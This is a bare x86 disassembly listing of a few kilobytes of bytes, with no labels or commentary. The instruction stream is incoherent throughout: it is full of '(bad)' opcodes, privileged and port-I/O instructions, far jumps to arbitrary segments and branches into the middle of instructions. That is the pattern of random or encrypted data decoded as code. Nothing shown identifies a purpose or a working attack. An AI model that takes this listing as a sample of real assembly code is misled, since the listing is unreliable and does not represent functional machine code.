  411d3a:	in     eax,dx
  411d3b:	lock mov WORD PTR [eax-0x59],fs
  411d3f:	repz test eax,0x8fe7d7ca
  411d45:	xchg   esi,eax
  411d46:	or     cl,BYTE PTR [ebx+ecx*2-0x4822b357]
  411d4d:	push   ebx
  411d4e:	jecxz  0x411d58
  411d50:	jne    0x411db6
  411d52:	inc    ecx
  411d53:	je     0x411d9f
  411d55:	mov    esp,0xd200ba0d
  411d5a:	push   ecx
  411d5b:	or     ebx,DWORD PTR [esi+ecx*1-0x66]
  411d5f:	cld    
  411d60:	das    
  411d61:	dec    ebx
  411d62:	sub    ebx,esi
  411d64:	pop    esp
  411d65:	xchg   edx,eax
  411d66:	sbb    DWORD PTR ds:0x2511042e,0x2177930d
  411d70:	push   eax
  411d71:	mov    DWORD PTR [esi],edi
  411d73:	pusha  
  411d74:	inc    esi
  411d75:	jp     0x411d44
  411d77:	jns    0x411d35
  411d79:	scas   al,BYTE PTR es:[edi]
  411d7a:	sahf   
  411d7b:	ficomp DWORD PTR [edi+0x59ec7eb]
  411d81:	add    esp,ecx
  411d83:	jmp    FWORD PTR [ebx+0x7497a117]
  411d89:	mov    esi,0xbbea665b
  411d8e:	repnz fscale 
  411d91:	mov    bh,0xef
  411d93:	jmp    0x411d8a
  411d95:	sbb    bh,BYTE PTR [esi-0x73f3256]
  411d9b:	lods   eax,DWORD PTR ds:[esi]
  411d9c:	scas   al,BYTE PTR es:[edi]
  411d9d:	cmp    bl,dh
  411d9f:	mov    cl,0xff
  411da1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411da2:	repz push edx
  411da4:	es mov ah,0x83
  411da7:	mov    al,ds:0xe21b679a
  411dac:	test   DWORD PTR [ecx+0x12],ebx
  411daf:	jg     0x411d6b
  411db1:	ja     0x411df5
  411db3:	pop    es
  411db4:	dec    ebx
  411db5:	mov    dh,0xcd
  411db7:	xchg   ecx,eax
  411db8:	pop    eax
  411db9:	fistp  DWORD PTR [eax+ebp*2]
  411dbc:	test   al,0xda
  411dbe:	jl     0x411e3d
  411dc0:	(bad)  
  411dc1:	jns    0x411dea
  411dc3:	fld    TBYTE PTR [edx-0x7c0d83a2]
  411dc9:	test   DWORD PTR [esp+edi*4-0x2555b44f],edi
  411dd0:	cmp    al,0xe0
  411dd2:	and    BYTE PTR ds:[esi+0x4188b2ac],dl
  411dd9:	inc    edi
  411dda:	es shl ah,0x15
  411dde:	xor    eax,0x7d2ca70e
  411de3:	mov    edx,0xd915e561
  411de8:	test   ebx,eax
  411dea:	or     al,0x18
  411dec:	fcom   QWORD PTR [ebx]
  411dee:	inc    ebp
  411def:	std    
  411df0:	hlt    
  411df1:	dec    ebx
  411df2:	test   al,0x62
  411df4:	out    dx,eax
  411df5:	call   0x2a991850
  411dfa:	fsubr  QWORD PTR [edi-0x75738c84]
  411e00:	cmp    bh,BYTE PTR [eax-0x38]
  411e03:	xor    al,0xe0
  411e05:	out    dx,al
  411e06:	(bad)  
  411e08:	sub    edx,DWORD PTR [eax]
  411e0a:	sahf   
  411e0b:	jb     0x411e89
  411e0d:	mov    al,0x3c
  411e0f:	pushf  
  411e10:	dec    esp
  411e11:	or     BYTE PTR [ecx],al
  411e13:	mov    bh,0x78
  411e15:	adc    DWORD PTR [edi-0x75],esp
  411e18:	xacquire xchg DWORD PTR [esi+0x59c138b1],esi
  411e1f:	das    
  411e20:	sub    DWORD PTR [ebx+0x66d5503],ebx
  411e26:	ret    0x5aba
  411e29:	cmp    DWORD PTR [esp+eax*8-0x37],esp
  411e2d:	xchg   esi,eax
  411e2e:	mov    WORD PTR [edi-0x37],?
  411e31:	icebp  
  411e32:	out    dx,eax
  411e33:	sbb    DWORD PTR [ebx+0x2f],edi
  411e36:	lods   al,BYTE PTR ds:[esi]
  411e37:	int    0xc
  411e39:	mov    ch,0xe0
  411e3b:	out    0xc,eax
  411e3d:	outs   dx,BYTE PTR ds:[esi]
  411e3e:	je     0x411e40
  411e40:	inc    ebp
  411e41:	fcmovne st,st(0)
  411e43:	pusha  
  411e44:	and    al,0x3d
  411e46:	add    eax,0xfe8ec419
  411e4b:	jb     0x411e87
  411e4d:	and    DWORD PTR [edi+0x53],ebx
  411e50:	pop    ebp
  411e51:	sub    esi,esp
  411e53:	sub    al,0xd0
  411e55:	pop    edx
  411e56:	mov    bl,BYTE PTR [eax]
  411e58:	mov    dl,0xf2
  411e5a:	ja     0x411ea7
  411e5c:	fprem  
  411e5e:	pop    es
  411e5f:	add    eax,0x2dc8d711
  411e64:	frstor [edi+0x9]
  411e67:	cmp    BYTE PTR [ebp-0x48392bf0],dl
  411e6d:	leave  
  411e6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e6f:	(bad)  
  411e70:	dec    ecx
  411e71:	jmp    0x411e53
  411e73:	bound  eax,QWORD PTR [edx-0x2e]
  411e76:	mov    eax,fs:0x1e6f90b3
  411e7c:	pop    ebx
  411e7d:	or     esi,ebx
  411e7f:	ins    DWORD PTR es:[edi],dx
  411e80:	cs loope 0x411e62
  411e83:	fnclex 
  411e85:	dec    esi
  411e86:	mov    ebx,0x246c321c
  411e8b:	jl     0x411e89
  411e8d:	mov    bl,0x8c
  411e8f:	cmp    ebx,ebx
  411e91:	repnz push 0x69
  411e94:	(bad)  
  411e95:	cmp    al,0xeb
  411e97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e98:	stos   DWORD PTR es:[edi],eax
  411e99:	dec    ebx
  411e9a:	and    eax,0x2f96fad8
  411e9f:	fcmovbe st,st(7)
  411ea1:	nop
  411ea2:	repnz xchg ecx,eax
  411ea4:	daa    
  411ea5:	int    0x11
  411ea7:	mov    ss,WORD PTR [ebx]
  411ea9:	ins    BYTE PTR es:[edi],dx
  411eaa:	clc    
  411eab:	inc    ecx
  411eac:	push   ds
  411ead:	stc    
  411eae:	cmp    BYTE PTR [edx+0x68668ac4],cl
  411eb4:	mov    ecx,0x66c16ce2
  411eb9:	scas   al,BYTE PTR es:[edi]
  411eba:	out    0xe1,eax
  411ebc:	stos   DWORD PTR es:[edi],eax
  411ebd:	xchg   BYTE PTR [esi+0x61],ah
  411ec0:	xchg   edi,eax
  411ec1:	adc    ebp,esp
  411ec3:	mov    ds,WORD PTR [ecx-0x5a]
  411ec6:	int3   
  411ec7:	pop    es
  411ec8:	sbb    al,0x36
  411eca:	mov    dh,0xf8
  411ecc:	(bad)  
  411ecd:	call   0x40dca281
  411ed2:	lods   eax,DWORD PTR ds:[esi]
  411ed3:	dec    ecx
  411ed4:	push   edx
  411ed5:	out    0xba,eax
  411ed7:	inc    ebx
  411ed8:	jmp    0x411edf
  411eda:	in     eax,dx
  411edb:	gs pop ebp
  411edd:	out    0x17,eax
  411edf:	leave  
  411ee0:	mov    WORD PTR [ecx-0x1fdbd448],es
  411ee6:	jmp    0x71c3:0xab1718ed
  411eed:	(bad)  
  411eee:	jae    0x411f08
  411ef0:	xchg   ebx,eax
  411ef1:	sub    eax,0xc139dc42
  411ef6:	mov    WORD PTR [ebx+0x54339065],gs
  411efc:	mov    ds:0x5d667b9f,al
  411f01:	sub    dl,ah
  411f03:	icebp  
  411f04:	and    eax,0xa662bc60
  411f09:	inc    esp
  411f0a:	outs   dx,BYTE PTR ds:[esi]
  411f0b:	gs dec ebx
  411f0d:	push   edi
  411f0e:	int3   
  411f0f:	out    dx,eax
  411f10:	stos   BYTE PTR es:[edi],al
  411f11:	stc    
  411f12:	mov    ah,bl
  411f14:	push   ss
  411f15:	jmp    0xf2e49a2e
  411f1a:	pop    ds
  411f1b:	pop    edx
  411f1c:	imul   ebp,DWORD PTR [esp+edi*1-0x61],0xed655d2e
  411f24:	call   0xaa67:0xd67886a5
  411f2b:	int    0x2
  411f2d:	aaa    
  411f2e:	cmp    al,0xa
  411f30:	mov    eax,ds:0xe6bb8671
  411f35:	outs   dx,BYTE PTR ds:[esi]
  411f36:	and    bl,bl
  411f38:	leave  
  411f39:	jnp    0x411ecf
  411f3b:	add    DWORD PTR [ecx+0x51],esp
  411f3e:	jb     0x411ee5
  411f40:	mov    esp,0x124619d3
  411f45:	lahf   
  411f46:	or     al,0x5b
  411f48:	xchg   ecx,eax
  411f49:	daa    
  411f4a:	inc    eax
  411f4b:	popa   
  411f4c:	aas    
  411f4d:	ret    
  411f4e:	sbb    al,0x42
  411f50:	mov    BYTE PTR [edi+0x163c9969],bl
  411f56:	loopne 0x411f00
  411f58:	cmp    dh,BYTE PTR [edx]
  411f5a:	fdivr  QWORD PTR [ebx]
  411f5c:	jge    0x411f66
  411f5e:	mov    ds:0x44d900fa,al
  411f63:	out    dx,al
  411f64:	push   esp
  411f65:	pusha  
  411f66:	loopne 0x411f7d
  411f68:	pop    ebp
  411f69:	(bad)  
  411f6a:	imul   esi,DWORD PTR [eax-0x68ce3902],0xfba72598
  411f74:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f76:	mov    edx,0x3c61e6c6
  411f7b:	mov    al,0x78
  411f7d:	pop    eax
  411f7e:	sbb    eax,0x198a1818
  411f83:	in     al,dx
  411f84:	out    dx,eax
  411f85:	mov    dl,0x43
  411f87:	cs xchg edi,eax
  411f89:	fcmovnbe st,st(6)
  411f8b:	push   eax
  411f8c:	mov    dh,0x0
  411f8e:	pushf  
  411f8f:	nop
  411f90:	pop    esp
  411f91:	inc    esp
  411f92:	data16 scas al,BYTE PTR es:[edi]
  411f94:	jp     0x411f49
  411f96:	sbb    al,0x5c
  411f98:	cs movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f9b:	sub    al,0x4e
  411f9d:	pop    ebp
  411f9e:	jae    0x411f53
  411fa0:	aad    0xbb
  411fa2:	sub    bh,ah
  411fa4:	pusha  
  411fa5:	stos   DWORD PTR es:[edi],eax
  411fa6:	loop   0x411f3f
  411fa8:	ret    
  411fa9:	adc    BYTE PTR [ebx-0x46],0x9
  411fad:	jbe    0x411f5a
  411faf:	fisttp DWORD PTR [ecx-0x6f0e94d5]
  411fb5:	add    al,BYTE PTR [eax+0x4d9d17bf]
  411fbb:	push   0xa06256cb
  411fc0:	ss jno 0x411f89
  411fc3:	mov    dh,al
  411fc5:	inc    esp
  411fc6:	or     al,0x39
  411fc8:	adc    DWORD PTR [esi-0x12],edx
  411fcb:	mov    ebp,0x4a06bb1e
  411fd0:	adc    DWORD PTR [edx-0x298f4dc7],esp
  411fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fd7:	push   ebp
  411fd8:	rol    DWORD PTR [ecx],1
  411fda:	inc    esp
  411fdb:	(bad)  
  411fdc:	jb     0x411fa1
  411fde:	hlt    
  411fdf:	in     eax,0x24
  411fe1:	(bad)  
  411fe2:	jge    0x412049
  411fe4:	sahf   
  411fe5:	fnsave [ebx+eax*2]
  411fe8:	pop    ebx
  411fe9:	(bad)  
  411fea:	adc    al,0x53
  411fec:	clc    
  411fed:	fmul   QWORD PTR [eax]
  411fef:	or     DWORD PTR [ebx+eax*1-0x42],0xf36c48c0
  411ff7:	adc    ecx,DWORD PTR [eax+edi*2]
  411ffa:	das    
  411ffb:	push   ds
  411ffc:	sbb    BYTE PTR [eiz*2-0xd6dd8b3],bl
  412003:	shl    DWORD PTR [edx+0x7b],1
  412006:	bound  ebp,QWORD PTR [eax-0x3d]
  412009:	xchg   ecx,eax
  41200a:	cmp    BYTE PTR [edx+edi*2+0x17],0xf1
  41200f:	or     DWORD PTR [ecx-0x23],esp
  412012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412013:	loope  0x411fee
  412015:	int    0xd4
  412017:	add    BYTE PTR [ebx-0x50],ah
  41201a:	add    BYTE PTR [ebp-0x11],ah
  41201d:	xor    ah,dl
  41201f:	push   0xf147e6a9
  412024:	push   edi
  412025:	fs inc esp
  412027:	push   esp
  412028:	js     0x412055
  41202a:	xor    DWORD PTR [edx-0x66],eax
  41202d:	push   ds
  41202e:	mov    ebx,0x8ad88f42
  412033:	push   esi
  412034:	pop    esi
  412035:	adc    DWORD PTR [esi-0xc],0xffffff8f
  412039:	add    eax,0x67290de1
  41203e:	add    DWORD PTR [edx+0x2a703df6],edx
  412044:	pop    eax
  412045:	xor    al,0xed
  412047:	icebp  
  412048:	mov    WORD PTR [edx-0x3d],?
  41204b:	jo     0x41208a
  41204d:	pop    edi
  41204e:	sub    eax,DWORD PTR [ebp+ecx*8+0x6f]
  412052:	sahf   
  412053:	les    esp,FWORD PTR [edi]
  412055:	or     DWORD PTR [eax-0x6244d7f0],0x6e
  41205c:	xor    DWORD PTR [edi-0x53],ebx
  41205f:	cdq    
  412060:	sub    al,0xe2
  412062:	xchg   edi,eax
  412063:	dec    BYTE PTR [eax+0x6a]
  412066:	call   0x2df307c8
  41206b:	fcmovb st,st(7)
  41206d:	jp     0x41205c
  41206f:	call   0xb8bf:0x78c75c72
  412076:	push   es
  412077:	enter  0x7720,0x6c
  41207b:	cld    
  41207c:	std    
  41207d:	xchg   esi,eax
  41207e:	lea    esp,[ebx+0x3587a15c]
  412084:	push   ss
  412085:	aaa    
  412086:	xor    ch,BYTE PTR [ecx+ecx*8+0x5d]
  41208a:	dec    edx
  41208b:	sub    DWORD PTR [edx+0x68ac0804],ebp
  412091:	test   al,0xd9
  412093:	shl    DWORD PTR ds:0xb0bdb79f,0xb2
  41209a:	push   esi
  41209b:	cld    
  41209c:	push   0xcc17da69
  4120a1:	jbe    0x412057
  4120a3:	sar    BYTE PTR [edi],0xe6
  4120a6:	adc    BYTE PTR [ebx-0x7b3168b8],cl
  4120ac:	popf   
  4120ad:	mov    ah,0x13
  4120af:	ins    DWORD PTR es:[edi],dx
  4120b0:	adc    BYTE PTR [ebp-0x76],0x21
  4120b4:	outs   dx,DWORD PTR ds:[esi]
  4120b5:	adc    bl,BYTE PTR [edi-0x46]
  4120b8:	(bad)  [ebp-0x2a0eb1ee]
  4120be:	mov    eax,0xbf72ec84
  4120c3:	rcl    eax,1
  4120c5:	sbb    BYTE PTR [edx-0x31],dh
  4120c8:	jb     0x4120ba
  4120ca:	sbb    eax,0xeeceb6b0
  4120cf:	adc    cl,BYTE PTR [edx+0x7e801ede]
  4120d5:	retf   
  4120d6:	xor    BYTE PTR [ecx],bh
  4120d8:	mov    BYTE PTR [ebx-0x5c4e17c1],cl
  4120de:	xchg   edi,eax
  4120df:	loop   0x41207f
  4120e1:	fcomi  st,st(7)
  4120e3:	icebp  
  4120e4:	test   eax,0xe355f9c9
  4120e9:	addr16 std 
  4120eb:	pop    eax
  4120ec:	xor    dl,dl
  4120ee:	mov    ds:0x224d3d9c,eax
  4120f3:	mov    esp,0xb9c7b210
  4120f8:	add    bl,BYTE PTR [edi-0x79383934]
  4120fe:	std    
  4120ff:	daa    
  412100:	dec    ecx
  412101:	ror    dh,1
  412103:	inc    eax
  412104:	in     al,0x0
  412106:	jecxz  0x41210f
  412108:	popa   
  412109:	or     BYTE PTR [ecx+0x7e],bl
  41210c:	cmc    
  41210d:	or     eax,0xcbc24617
  412112:	cld    
  412113:	leave  
  412114:	or     eax,0x5f2dd003
  412119:	sub    BYTE PTR [edx+0xec9206],dh
  41211f:	js     0x41211d
  412121:	mov    dh,0xc6
  412123:	jbe    0x41215e
  412125:	push   eax
  412126:	or     DWORD PTR [edi+0x3845231e],ebp
  41212c:	ins    BYTE PTR es:[edi],dx
  41212d:	sbb    ah,dh
  41212f:	dec    ebx
  412130:	(bad)  
  412131:	(bad)  
  412132:	and    DWORD PTR [ecx+0x7f],edi
  412135:	cld    
  412136:	or     al,0xcd
  412138:	mov    ds:0xfb30feb9,eax
  41213d:	out    dx,al
  41213e:	mov    bl,0x96
  412140:	push   edx
  412141:	sbb    al,BYTE PTR [ebx+0x510de055]
  412147:	inc    edi
  412148:	or     eax,0x3f70fcf3
  41214d:	xor    al,0x46
  41214f:	or     al,0x9b
  412151:	xor    esp,0xb
  412154:	push   esp
  412155:	pushf  
  412156:	cmc    
  412157:	dec    edi
  412158:	nop
  412159:	mov    WORD PTR [esi-0x44ec5645],?
  41215f:	push   eax
  412160:	dec    edx
  412161:	xor    al,0xa6
  412163:	mov    al,0xbc
  412165:	jne    0x412171
  412167:	or     BYTE PTR [edx+0x75],al
  41216a:	xlat   BYTE PTR ds:[ebx]
  41216b:	out    dx,ax
  41216d:	inc    edx
  41216e:	sti    
  41216f:	ss in  eax,dx
  412171:	add    cl,BYTE PTR [ecx+0x38658d70]
  412177:	mov    cl,0xa3
  412179:	jbe    0x412166
  41217b:	mov    ds:0x7ad63cb2,al
  412180:	scas   al,BYTE PTR es:[edi]
  412181:	add    eax,0xffa37d9c
  412186:	cmc    
  412187:	or     esi,DWORD PTR [esi+0x6f]
  41218a:	sbb    al,0xbe
  41218c:	std    
  41218d:	mov    ds:0xa4d8d5f9,eax
  412192:	push   esi
  412193:	sub    BYTE PTR [edx+0x1b],0xef
  412197:	sub    DWORD PTR [esi+0x5fb32c69],esp
  41219d:	in     al,0xe3
  41219f:	mov    al,0xd5
  4121a1:	aas    
  4121a2:	sub    al,BYTE PTR [eax-0x1a]
  4121a5:	dec    ebx
  4121a6:	adc    edx,0x52e2519f
  4121ac:	dec    ebx
  4121ad:	and    DWORD PTR [ebp-0x2861f300],ebx
  4121b3:	out    0x6,al
  4121b5:	cld    
  4121b6:	ret    0xcbab
  4121b9:	out    dx,al
  4121ba:	test   DWORD PTR [ebp+0x125e7d54],ebx
  4121c0:	push   0x79
  4121c2:	add    BYTE PTR [edx],ah
  4121c4:	xchg   cl,dl
  4121c6:	loope  0x412165
  4121c8:	adc    BYTE PTR ss:[edi+ecx*1+0x5f],al
  4121cd:	jle    0x4121c4
  4121cf:	add    eax,0x5dcf0798
  4121d4:	mov    edi,0xc29c8d4e
  4121d9:	clc    
  4121da:	dec    edx
  4121db:	xchg   edx,eax
  4121dc:	cmp    eax,0x8a995328
  4121e1:	mov    ebx,0xcf67dd27
  4121e6:	dec    ebp
  4121e7:	data16 add BYTE PTR [edx],0x0
  4121eb:	shl    BYTE PTR [eax*2+0x25b85a8c],cl
  4121f2:	add    DWORD PTR [eiz*4+0x68cca8c0],ebp
  4121f9:	xor    DWORD PTR [eax-0x4e],0xfc232274
  412200:	adc    bh,dh
  412202:	popf   
  412203:	fimul  WORD PTR [eax+ebx*2+0x76dde8ed]
  41220a:	ins    BYTE PTR es:[edi],dx
  41220b:	mov    bl,0x71
  41220d:	xor    eax,0xc1538229
  412212:	sub    al,0x1
  412214:	mov    bl,0x92
  412216:	test   DWORD PTR [esi+ecx*8-0x63d58967],edi
  41221d:	jno    0x412285
  41221f:	mov    eax,ds:0xe4724e78
  412224:	popa   
  412225:	(bad)  [edi-0x269ea998]
  41222b:	inc    ecx
  41222c:	or     esi,DWORD PTR [edi+0x32]
  41222f:	xchg   ecx,eax
  412230:	aam    0x48
  412232:	add    al,0xba
  412234:	jmp    0x2738:0x41ea0492
  41223b:	(bad)  [ebx-0x2b]
  41223e:	xchg   BYTE PTR [esi-0x39],al
  412241:	and    edx,edi
  412243:	nop
  412244:	mov    ah,0xbb
  412246:	fwait
  412247:	aam    0xb0
  412249:	stos   DWORD PTR es:[edi],eax
  41224a:	ret    0xcb9d
  41224d:	jno    0x412206
  41224f:	test   BYTE PTR [ebx-0x3d],bl
  412252:	mov    ebp,0x77cf0166
  412257:	add    BYTE PTR [esp+ebx*2+0x4b],0x86
  41225c:	inc    ebx
  41225d:	mov    ah,0x6c
  41225f:	out    dx,eax
  412260:	mov    WORD PTR [edx+0x7b],?
  412263:	push   esp
  412264:	aam    0x3a
  412266:	daa    
  412267:	mov    ch,0x16
  412269:	cmp    BYTE PTR [eax+0x55],bh
  41226c:	inc    ecx
  41226d:	xchg   ebx,eax
  41226e:	es mov ah,0xe8
  412271:	mov    eax,0x8c80b4b2
  412276:	mov    esp,0x7cc0288e
  41227b:	(bad)  
  41227c:	fs retf 0x4575
  412280:	xor    ah,bh
  412282:	mov    edi,0xb1eec499
  412287:	sub    ebx,0xd602a35d
  41228d:	jmp    0x234bc989
  412292:	pop    edi
  412293:	jecxz  0x412279
  412295:	mov    eax,0x7a61ea0c
  41229a:	aas    
  41229b:	ins    BYTE PTR es:[edi],dx
  41229c:	fwait
  41229d:	adc    dh,BYTE PTR [esi]
  41229f:	lock cdq 
  4122a1:	mov    eax,0x9ca322ad
  4122a6:	sbb    DWORD PTR [edi-0x2e],eax
  4122a9:	imul   ebp,DWORD PTR [edx+0x12899dff],0x5
  4122b0:	add    BYTE PTR [ebx+0x17],ah
  4122b3:	fptan  
  4122b5:	lock sti 
  4122b7:	popa   
  4122b8:	sar    BYTE PTR [ebx+0x4f],1
  4122bb:	je     0x4122a7
  4122bd:	popa   
  4122be:	push   esp
  4122bf:	pop    edi
  4122c0:	mov    ebx,0x5df92797
  4122c5:	xchg   DWORD PTR [ebp+0x5890d821],ebp
  4122cb:	(bad)  [esi]
  4122cd:	add    BYTE PTR [eax+0x5],bl
  4122d0:	push   0x3a
  4122d2:	sbb    ebp,DWORD PTR [edx+0x47]
  4122d5:	aam    0x31
  4122d7:	clc    
  4122d8:	nop
  4122d9:	fwait
  4122da:	les    eax,FWORD PTR [edx-0x3cd78f57]
  4122e0:	(bad)  
  4122e1:	nop
  4122e2:	popf   
  4122e3:	or     ebx,esp
  4122e5:	mov    ebp,0x9a3ed262
  4122ea:	jno    0x412327
  4122ec:	and    ebx,DWORD PTR [edi]
  4122ee:	rol    BYTE PTR [esi-0x62],0xf6
  4122f2:	in     eax,dx
  4122f3:	and    ecx,eax
  4122f5:	sub    BYTE PTR [edx+0x7090c75d],dh
  4122fb:	and    eax,0xff40929f
  412300:	retf   0x301b
  412303:	add    edi,ecx
  412305:	loopne 0x4122ad
  412307:	push   ebx
  412308:	daa    
  412309:	inc    edi
  41230a:	pop    eax
  41230b:	(bad)  
  41230c:	fs jle 0x41232d
  41230f:	mov    DWORD PTR [ebx],eax
  412311:	(bad)  
  412313:	cli    
  412314:	xchg   esp,eax
  412315:	inc    edi
  412316:	mov    BYTE PTR [esi+0x29],cl
  412319:	mov    WORD PTR [edi+0x4b],fs
  41231c:	jne    0x4122b4
  41231e:	sub    eax,0x231d983a
  412323:	mov    dh,BYTE PTR ds:0x401f1938
  412329:	leave  
  41232a:	cmc    
  41232b:	mov    ecx,DWORD PTR [ebx]
  41232d:	outs   dx,DWORD PTR ds:[esi]
  41232e:	add    DWORD PTR [ebx+eiz*1-0x26],esi
  412332:	cmp    BYTE PTR [edx],ch
  412334:	ja     0x412394
  412336:	sub    cl,bl
  412338:	mov    eax,ds:0x5fa844b3
  41233d:	or     bl,BYTE PTR [eax+0x6a097a03]
  412343:	test   al,0x32
  412345:	xchg   esp,eax
  412346:	inc    esp
  412347:	push   ds
  412348:	sbb    BYTE PTR [edi+0x3ba906f2],0x94
  41234f:	inc    ebx
  412350:	int    0x97
  412352:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412353:	jp     0x412358
  412355:	and    ch,cl
  412357:	enter  0x3ec,0xf3
  41235b:	in     al,dx
  41235c:	frstor [ebx+0x6]
  41235f:	sbb    ebx,ecx
  412361:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412362:	mov    eax,0xd43c1608
  412367:	pop    ss
  412368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412369:	mov    WORD PTR [ebx],cs
  41236b:	loope  0x412341
  41236d:	int    0x89
  41236f:	pop    ecx
  412370:	cmc    
  412371:	xor    bh,BYTE PTR [ecx+0x61371aa5]
  412377:	ds in  eax,dx
  412379:	sbb    eax,0x47f42941
  41237e:	push   edi
  41237f:	and    BYTE PTR [esi+0x73],al
  412382:	add    DWORD PTR [edx+0x2e68a4d2],esp
  412388:	and    al,al
  41238a:	pop    esp
  41238b:	test   ecx,eax
  41238d:	jle    0x4123cb
  41238f:	fsubr  DWORD PTR [edi]
  412391:	int3   
  412392:	lea    esp,[ecx]
  412394:	add    eax,0xdef94c28
  412399:	hlt    
  41239a:	add    cl,BYTE PTR [edi]
  41239c:	and    ebp,0x749c5ed
  4123a2:	popf   
  4123a3:	mov    bl,0x1d
  4123a5:	idiv   DWORD PTR [esi+0x62]
  4123a8:	fwait
  4123a9:	mov    esi,0xc8810e14
  4123ae:	jge    0x4123a6
  4123b0:	in     eax,0xb1
  4123b2:	push   0xfffffff0
  4123b4:	data16 cmp al,0x79
  4123b7:	push   eax
  4123b8:	iret   
  4123b9:	pop    ds
  4123ba:	or     bh,cl
  4123bc:	fidiv  DWORD PTR [ecx]
  4123be:	pop    esi
  4123bf:	(bad)  
  4123c0:	mov    al,0x96
  4123c2:	fs fxch st(0)
  4123c5:	mov    bl,0x6f
  4123c7:	adc    DWORD PTR [ecx+0x301c287c],edx
  4123cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123ce:	push   es
  4123cf:	call   0x6742:0xdcca1b73
  4123d6:	out    0x2f,al
  4123d8:	popw   ss
  4123da:	mov    edi,0x3759a6ae
  4123df:	push   0x2c
  4123e1:	jle    0x4123b2
  4123e3:	cmp    cl,BYTE PTR [edi]
  4123e5:	pop    eax
  4123e6:	jmp    0x7e5e:0x7d180433
  4123ed:	add    esi,DWORD PTR [edx+esi*1-0x3a]
  4123f1:	sti    
  4123f2:	and    edx,eax
  4123f4:	in     al,0xe2
  4123f6:	mov    eax,0x4af43b15
  4123fb:	mov    ebp,DWORD PTR [eax+0x50011bcf]
  412401:	jle    0x41240c
  412403:	adc    DWORD PTR [edx+0x26f3ce41],0x6a
  41240a:	sbb    BYTE PTR [ebp+0x6ffd58f9],0xc9
  412411:	mov    bl,0x50
  412413:	mov    al,ds:0x213cdc0b
  412418:	mov    eax,0x6a0d7c1c
  41241d:	mov    bh,0xc8
  41241f:	f2xm1  
  412421:	les    esi,FWORD PTR [eax+0x26f8ae29]
  412427:	sub    al,0xa7
  412429:	jle    0x4123df
  41242b:	push   0x11
  41242d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41242e:	cli    
  41242f:	in     al,0xc4
  412431:	push   edx
  412432:	xlat   BYTE PTR ds:[ebx]
  412433:	mov    ah,0xc8
  412435:	lods   al,BYTE PTR ds:[esi]
  412436:	ins    BYTE PTR es:[edi],dx
  412437:	jo     0x412406
  412439:	jl     0x41246f
  41243b:	ins    BYTE PTR es:[edi],dx
  41243c:	push   ebx
  41243d:	inc    esi
  41243e:	inc    esi
  41243f:	in     al,dx
  412440:	mov    ds,WORD PTR ss:[ecx-0x2eae39bc]
  412447:	cli    
  412448:	pop    es
  412449:	nop
  41244a:	retf   
  41244b:	hlt    
  41244c:	push   esp
  41244d:	jmp    0x21312057
  412452:	outs   dx,DWORD PTR ds:[esi]
  412453:	jecxz  0x41243e
  412455:	fucomi st,st(5)
  412457:	mov    dl,0x9f
  412459:	and    al,0x62
  41245b:	out    0xbc,al
  41245d:	mov    edx,0x2c9e45c8
  412462:	add    al,al
  412464:	stc    
  412465:	imul   ebx,esp,0x1a
  412468:	mov    al,ds:0xaa8145e0
  41246d:	cmp    ebp,DWORD PTR [ebx]
  41246f:	das    
  412470:	loopne 0x412445
  412472:	dec    ecx
  412473:	pop    esi
  412474:	mov    al,ds:0xf20779a6
  412479:	mov    bl,0x41
  41247b:	inc    ebx
  41247c:	aam    0xd8
  41247e:	mov    esi,0xb3a4d7f
  412483:	ret    0x5ef5
  412486:	pop    edi
  412487:	cmp    al,BYTE PTR [esi]
  412489:	(bad)  
  41248b:	cmp    DWORD PTR [eax-0x70cfb9dc],0x2a
  412492:	int3   
  412493:	mov    BYTE PTR [ebx+eiz*8+0x111f7fd5],0xc4
  41249b:	leave  
  41249c:	xchg   ebp,eax
  41249d:	sub    DWORD PTR cs:[edi+edi*2-0x7b],ebx
  4124a2:	dec    ebx
  4124a3:	pop    edi
  4124a4:	call   DWORD PTR [eax-0x34412aad]
  4124aa:	jbe    0x41245e
  4124ac:	aaa    
  4124ad:	cs sahf 
  4124af:	mov    ecx,0x934cb0c1
  4124b4:	inc    esp
  4124b5:	xor    ah,BYTE PTR [esi+0x74]
  4124b8:	lahf   
  4124b9:	mov    dh,0x38
  4124bb:	adc    ecx,DWORD PTR [edx+0x54c7e85f]
  4124c1:	enter  0xc48d,0x88
  4124c5:	ret    0xd7ba
  4124c8:	rol    BYTE PTR [eax],0xff
  4124cb:	mov    edi,0x4572f84b
  4124d0:	xchg   ebx,eax
  4124d1:	stos   DWORD PTR es:[edi],eax
  4124d2:	or     al,BYTE PTR [ebp+0x38]
  4124d5:	inc    edi
  4124d6:	xchg   BYTE PTR [ecx+0x993e28a],al
  4124dc:	sbb    eax,0x823f2f97
  4124e1:	jne    0x412535
  4124e3:	mov    al,0x45
  4124e5:	mov    ch,0xa
  4124e7:	mov    dl,0x0
  4124e9:	mov    edi,0x3838b13f
  4124ee:	sub    cl,BYTE PTR [esi+0x30]
  4124f1:	xchg   esp,eax
  4124f2:	ins    DWORD PTR es:[edi],dx
  4124f3:	in     eax,0xf3
  4124f5:	mov    es,WORD PTR [edx]
  4124f7:	stc    
  4124f8:	std    
  4124f9:	push   0xffffff92
  4124fb:	jp     0x412530
  4124fd:	or     BYTE PTR [esi-0x8],bh
  412500:	adc    ecx,DWORD PTR [esi]
  412502:	pusha  
  412503:	fnstenv [eax-0xc]
  412506:	add    ah,0x36
  412509:	in     al,dx
  41250a:	and    cl,BYTE PTR [ebp+0x47]
  41250d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41250e:	push   esp
  41250f:	xchg   BYTE PTR [edx+0x46bfbc8],cl
  412515:	jne    0x4124cc
  412517:	cs out dx,al
  412519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41251b:	ds jb  0x41254e
